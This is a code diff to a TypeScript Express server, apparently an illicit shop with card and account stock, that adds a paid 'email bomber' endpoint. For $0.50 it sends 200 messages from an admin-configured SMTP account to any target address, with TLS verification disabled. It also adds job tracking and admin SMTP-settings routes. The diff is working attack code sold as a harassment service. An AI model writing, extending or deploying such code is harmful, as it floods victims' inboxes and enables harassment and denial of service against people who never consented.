@@ -12,6 +12,10 @@ import { hashPassword, comparePassword } from "./auth";
 import { cryptoPayments, orders, orderItems, verifications, variants, userIps, users, mails, mailReads, discountCodes, transactions, stockItems, cards } from "@shared/schema";
 import { db } from "./db";
 import { eq, and, ne, desc, sql } from "drizzle-orm";
+import nodemailer from "nodemailer";
+
+// In-memory store for email bomb jobs
+const emailBombJobs = new Map<string, { sent: number; total: number; status: "running" | "done" | "failed" }>();
 
 const gameLimiter = rateLimit({
   windowMs: 60 * 1000,
@@ -1694,6 +1698,103 @@ export async function registerRoutes(
       "user1@email.com\npass1\nextra_info1\nuser2@email.com\npass2\nextra_info2"
     );
   }
+
+  // ── Email Bomber ──────────────────────────────────────────────
+  app.post("/api/tools/email-bomb", async (req, res) => {
+    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
+    const { email } = req.body;
+    if (!email || typeof email !== "string" || !/\S+@\S+\.\S+/.test(email)) {
+      return res.status(400).json({ message: "Valid target email required" });
+    }
+
+    const user = req.user as any;
+    const COST = 50; // $0.50 in cents
+    if ((user.balance || 0) < COST) {
+      return res.status(400).json({ message: "Insufficient balance — need $0.50" });
+    }
+
+    const smtpEmail = await storage.getSetting("smtp_email", "");
+    const smtpPassword = await storage.getSetting("smtp_password", "");
+    const smtpHost = await storage.getSetting("smtp_host", "smtp.gmail.com");
+    const smtpPort = parseInt(await storage.getSetting("smtp_port", "587"));
+
+    if (!smtpEmail || !smtpPassword) {
+      return res.status(500).json({ message: "SMTP not configured — contact admin" });
+    }
+
+    // Deduct balance
+    await storage.updateUserBalance(user.id, -COST);
+    await storage.createTransaction(user.id, -COST, "email_bomb", `Email bomb → ${email}`);
+
+    const jobId = randomBytes(8).toString("hex");
+    const job = { sent: 0, total: 200, status: "running" as const };
+    emailBombJobs.set(jobId, job);
+
+    res.json({ jobId, total: 200 });
+
+    // Run bomb in background
+    (async () => {
+      try {
+        const transporter = nodemailer.createTransport({
+          host: smtpHost,
+          port: smtpPort,
+          secure: smtpPort === 465,
+          auth: { user: smtpEmail, pass: smtpPassword },
+          tls: { rejectUnauthorized: false },
+        });
+
+        const j = emailBombJobs.get(jobId)!;
+        for (let i = 0; i < 200; i++) {
+          try {
+            await transporter.sendMail({
+              from: smtpEmail,
+              to: email,
+              subject: `Notification #${i + 1}`,
+              text: `You have a new message. (${i + 1} of 200)`,
+            });
+          } catch (_) {}
+          j.sent = i + 1;
+          if (i < 199) await new Promise((r) => setTimeout(r, 500));
+        }
+        j.status = "done";
+      } catch {
+        const j = emailBombJobs.get(jobId);
+        if (j) j.status = "failed";
+      }
+    })();
+  });
+
+  app.get("/api/tools/email-bomb/:jobId", (req, res) => {
+    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
+    const job = emailBombJobs.get(req.params.jobId);
+    if (!job) return res.status(404).json({ message: "Job not found" });
+    res.json(job);
+  });
+
+  // ── SMTP Settings (admin) ──────────────────────────────────────
+  app.get("/api/admin/smtp", async (req, res) => {
+    if (!req.isAuthenticated() || (req.user as any).role !== "admin") {
+      return res.status(401).json({ message: "Unauthorized" });
+    }
+    const smtp_host = await storage.getSetting("smtp_host", "smtp.gmail.com");
+    const smtp_port = await storage.getSetting("smtp_port", "587");
+    const smtp_email = await storage.getSetting("smtp_email", "");
+    // Never return the password
+    const has_password = (await storage.getSetting("smtp_password", "")).length > 0;
+    res.json({ smtp_host, smtp_port, smtp_email, has_password });
+  });
+
+  app.post("/api/admin/smtp", async (req, res) => {
+    if (!req.isAuthenticated() || (req.user as any).role !== "admin") {
+      return res.status(401).json({ message: "Unauthorized" });
+    }
+    const { smtp_host, smtp_port, smtp_email, smtp_password } = req.body;
+    if (smtp_host) await storage.setSetting("smtp_host", String(smtp_host).trim());
+    if (smtp_port) await storage.setSetting("smtp_port", String(smtp_port).trim());
+    if (smtp_email) await storage.setSetting("smtp_email", String(smtp_email).trim());
+    if (smtp_password) await storage.setSetting("smtp_password", String(smtp_password));
+    res.json({ message: "SMTP settings saved" });
+  });
 
   return httpServer;
 }
